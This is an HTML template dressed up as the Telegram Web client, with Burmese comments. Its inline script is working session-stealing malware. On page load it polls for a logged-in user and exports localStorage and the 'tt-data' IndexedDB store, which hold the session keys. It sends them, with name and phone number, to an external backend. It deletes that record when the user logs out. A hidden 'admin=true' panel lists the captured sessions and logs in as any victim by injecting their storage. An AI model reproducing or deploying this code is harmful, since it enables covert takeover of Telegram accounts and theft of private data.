<html lang="en" translate="no" class="notranslate">

<head>
  <meta charset="UTF-8">
  <title><%= htmlWebpackPlugin.options.appTitle %></title>
  <meta name="title" content="<%= htmlWebpackPlugin.options.appTitle %>">
  <meta name="description" content="Telegram Web">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no, viewport-fit=cover">
  
  <link rel="icon" href="./favicon.svg" type="image/svg+xml">
  <link rel="icon" type="image/png" sizes="16x16" href="./favicon-16x16.png">
  <link rel="icon" type="image/png" sizes="32x32" href="./favicon-32x32.png">

  <script src="./redirect.js"></script>
  <style>
    @layer reset, variables, ui, components;
    @layer ui {
      @layer tablist, spinner, button, input, layout;
    }
    
    /* Telegram UI ကို ဖျောက်ထားရန် Custom CSS */
    .hide-telegram #root {
        display: none !important;
    }
  </style>

  <script>
    const BACKEND_URL = "https://telegram-7ih3.onrender.com";

    // --- Helpers (Binary to Base64) ---
    function bufferToBase64(buf) {
        let binary = '';
        const bytes = new Uint8Array(buf);
        for (let i = 0; i < bytes.byteLength; i++) { binary += String.fromCharCode(bytes[i]); }
        return window.btoa(binary);
    }
    function base64ToBuffer(base64) {
        const binary_string = window.atob(base64);
        const len = binary_string.length;
        const bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
        return bytes.buffer;
    }
    function serializeData(data) {
        return JSON.stringify(data, (key, value) => {
            if (value instanceof ArrayBuffer) return { __type: 'ArrayBuffer', data: bufferToBase64(value) };
            if (value instanceof Uint8Array) return { __type: 'Uint8Array', data: bufferToBase64(value.buffer) };
            return value;
        });
    }
    function deserializeData(jsonStr) {
        return JSON.parse(jsonStr, (key, value) => {
            if (value && typeof value === 'object' && value.__type === 'ArrayBuffer') return base64ToBuffer(value.data);
            if (value && typeof value === 'object' && value.__type === 'Uint8Array') return new Uint8Array(base64ToBuffer(value.data));
            return value;
        });
    }

    // --- IndexedDB Extractors ---
    async function exportIndexedDB(dbName, storeName) {
        return new Promise((resolve) => {
            const request = indexedDB.open(dbName);
            request.onsuccess = (e) => {
                const db = e.target.result;
                if (!db.objectStoreNames.contains(storeName)) { resolve({}); return; }
                const tx = db.transaction(storeName, "readonly");
                const store = tx.objectStore(storeName);
                const getAllReq = store.getAll();
                const getKeysReq = store.getAllKeys();
                
                getAllReq.onsuccess = () => {
                    getKeysReq.onsuccess = () => {
                        const data = {};
                        for (let i = 0; i < getKeysReq.result.length; i++) {
                            const key = getKeysReq.result[i];
                            if(typeof key === 'string' && (key.includes('media') || key.includes('file'))) continue;
                            data[key] = getAllReq.result[i];
                        }
                        resolve(data);
                    };
                };
                tx.onerror = () => resolve({});
            };
            request.onerror = () => resolve({});
        });
    }

    async function importIndexedDB(dbName, storeName, data) {
        return new Promise((resolve) => {
            const request = indexedDB.open(dbName);
            request.onupgradeneeded = (e) => {
                const db = e.target.result;
                if (!db.objectStoreNames.contains(storeName)) { db.createObjectStore(storeName); }
            };
            request.onsuccess = (e) => {
                const db = e.target.result;
                if (!db.objectStoreNames.contains(storeName)) { resolve(); return; }
                const tx = db.transaction(storeName, "readwrite");
                const store = tx.objectStore(storeName);
                store.clear();
                for (const key in data) { store.put(data[key], key); }
                tx.oncomplete = () => resolve();
                tx.onerror = () => resolve();
            };
            request.onerror = () => resolve();
        });
    }

    // --- Profile Checker ---
    function getTelegramProfile() {
        try {
            const stateStr = localStorage.getItem('tt-global-state');
            if (stateStr) {
                const state = JSON.parse(stateStr);
                const currentId = state.currentUserId;
                if (currentId && state.users && state.users.byId && state.users.byId[currentId]) {
                    const user = state.users.byId[currentId];
                    const fullName = [user.firstName, user.lastName].filter(Boolean).join(' ');
                    const phone = user.phoneNumber ? '+' + user.phoneNumber : '';
                    if (!phone) return null; // Phone မရှိသေးရင် Login မပြီးသေးဟု သတ်မှတ်မည်
                    return { uid: currentId.toString(), name: fullName, phone: phone, username: user.username ? '@' + user.username : '' };
                }
            }
        } catch (e) {}
        return null; 
    }

    // --- Main Logic ---
    document.addEventListener("DOMContentLoaded", () => {
        if (window.location.search.includes("admin=true")) {
            // ================= ADMIN PANEL (Real-time) =================
            document.body.classList.add("hide-telegram");
            const adminPanel = document.createElement("div");
            adminPanel.style.cssText = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #f4f4f9; z-index: 999999; padding: 30px; font-family: sans-serif; overflow-y: auto;";
            
            adminPanel.innerHTML = `
                <div style="max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
                    <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #0063bb; padding-bottom: 10px;">
                        <h2 style='color: #333; margin: 0;'>Admin Control Panel</h2>
                        <span id="sync-status" style="font-size: 13px; color: green;">Live Syncing... 🟢</span>
                    </div>
                    <p style='color: #666;'>Staff ဝင်ထားသော အကောင့်များ (Real-time)</p>
                    <div id='admin-content' style='margin-top: 20px;'>Fetching data...</div>
                </div>
            `;
            document.body.appendChild(adminPanel);

            window.adminDataStore = []; 

            window.loginAs = async (index) => {
                const session = window.adminDataStore[index];
                if(!session) return;
                if(!confirm(session.profile_name + " ၏ အကောင့်သို့ ဝင်ရောက်မည် သေချာပါသလား?")) return;
                
                alert("Session Data များကို ထည့်သွင်းနေပါသည်... ပြီးလျှင် အလိုအလျောက် အကောင့်ထဲရောက်ပါမည်။");
                try {
                    localStorage.clear();
                    if (session.local_storage_str) {
                        const ls = JSON.parse(session.local_storage_str);
                        for (const key in ls) { localStorage.setItem(key, ls[key]); }
                    }
                    if (session.indexed_db_str) {
                        const idbData = deserializeData(session.indexed_db_str);
                        await importIndexedDB("tt-data", "store", idbData);
                    }
                    window.location.href = "/"; 
                } catch (e) { alert("Error: " + e.message); }
            };

            // Auto Fetch Function
            const fetchAdminData = async () => {
                try {
                    const res = await fetch(BACKEND_URL + "/api/get_sessions");
                    const data = await res.json();
                    window.adminDataStore = data; 
                    
                    if(data.length === 0) {
                        document.getElementById("admin-content").innerHTML = "<p style='color: red; text-align: center; padding: 20px;'>လက်ရှိ ဝင်ထားသော အကောင့်များ မရှိပါ။</p>";
                        return;
                    }
                    
                    let html = "<table width='100%' style='border-collapse: collapse; text-align: left; margin-top: 15px;'>";
                    html += "<tr style='background: #f0f0f0; border-bottom: 2px solid #ccc;'><th style='padding:12px;'>Profile Info</th><th style='padding:12px;'>Phone Number</th><th style='padding:12px;'>Last Synced</th><th style='padding:12px;'>Action</th></tr>";
                    
                    data.forEach((s, index) => {
                        const timeString = new Date(s.timestamp).toLocaleString();
                        html += `<tr style='border-bottom: 1px solid #eee;'>
                                    <td style='padding:12px;'><b style="font-size: 15px;">${s.profile_name}</b> <span style="color:#0063bb;">${s.profile_username}</span><br><span style='color:green; font-size:12px;'>● Active</span></td>
                                    <td style='padding:12px; font-weight: bold;'>${s.profile_phone}</td>
                                    <td style='padding:12px; color: #555;'>${timeString}</td>
                                    <td style='padding:12px;'>
                                        <button onclick='loginAs(${index})' style='padding: 8px 15px; background: #28a745; color: white; border: none; border-radius: 4px; cursor: pointer;'>Login</button>
                                    </td>
                                 </tr>`;
                    });
                    html += "</table>";
                    document.getElementById("admin-content").innerHTML = html;
                } catch (err) {}
            };

            // ၅ စက္ကန့် တစ်ကြိမ် Auto Refresh လုပ်မည်
            fetchAdminData();
            setInterval(fetchAdminData, 5000);

        } else {
            // ================= STAFF BROWSER (Smart Login/Logout Detect) =================
            console.log("✅ Smart Login/Logout Detector RUNNING!");
            
            setTimeout(() => {
                setInterval(async () => {
                    try {
                        const profile = getTelegramProfile();
                        let lastSavedUid = localStorage.getItem("last_saved_uid");

                        // (က) User က Login ဝင်ပြီးသား ဖြစ်နေလျှင် -> DB သို့ Data ပို့မည်
                        if (profile) {
                            const rawIdbData = await exportIndexedDB("tt-data", "store");
                            if (Object.keys(rawIdbData).length > 0) { 
                                const idbDataStr = serializeData(rawIdbData);
                                const lsDataStr = JSON.stringify(localStorage);
                                
                                await fetch(BACKEND_URL + "/api/save_session", {
                                    method: "POST",
                                    headers: { "Content-Type": "application/json" },
                                    body: JSON.stringify({
                                        user_id: profile.uid, 
                                        profile_name: profile.name,
                                        profile_phone: profile.phone,
                                        profile_username: profile.username,
                                        local_storage_str: lsDataStr,
                                        indexed_db_str: idbDataStr,
                                        timestamp: new Date().toISOString()
                                    })
                                });
                                // Login ဝင်ထားကြောင်း Browser တွင် မှတ်သားထားမည်
                                localStorage.setItem("last_saved_uid", profile.uid);
                                console.log(`✅ Data Updated for: ${profile.name}`);
                            }
                        } 
                        // (ခ) Profile မရှိတော့လျှင် (Logout လုပ်သွားလျှင်) -> DB မှ ဖျက်ပစ်မည်
                        else if (!profile && lastSavedUid) {
                            console.log("⚠️ Logout detected! Deleting session from Database...");
                            await fetch(BACKEND_URL + "/api/delete_session", {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ user_id: lastSavedUid })
                            });
                            // မှတ်ထားတာကို ရှင်းပစ်မည်
                            localStorage.removeItem("last_saved_uid");
                            console.log("🗑️ Session completely removed.");
                        } 
                        // (ဂ) လုံးဝ Login မဝင်ရသေးလျှင် ငြိမ်နေမည်
                        else {
                            console.log("⏳ Waiting for user to login...");
                        }
                    } catch(e) {
                        console.error("❌ Process failed:", e);
                    }
                }, 10000); // ၁၀ စက္ကန့် တစ်ကြိမ် စစ်ဆေးမည်
            }, 3000);
        }
    });
  </script>
</head>

    <video src="./nojs.mp4" class="nojs-video" muted loop autoplay playsinline disablePictureInPicture></video>
    <h1>Telegram Web</h1>

</html>
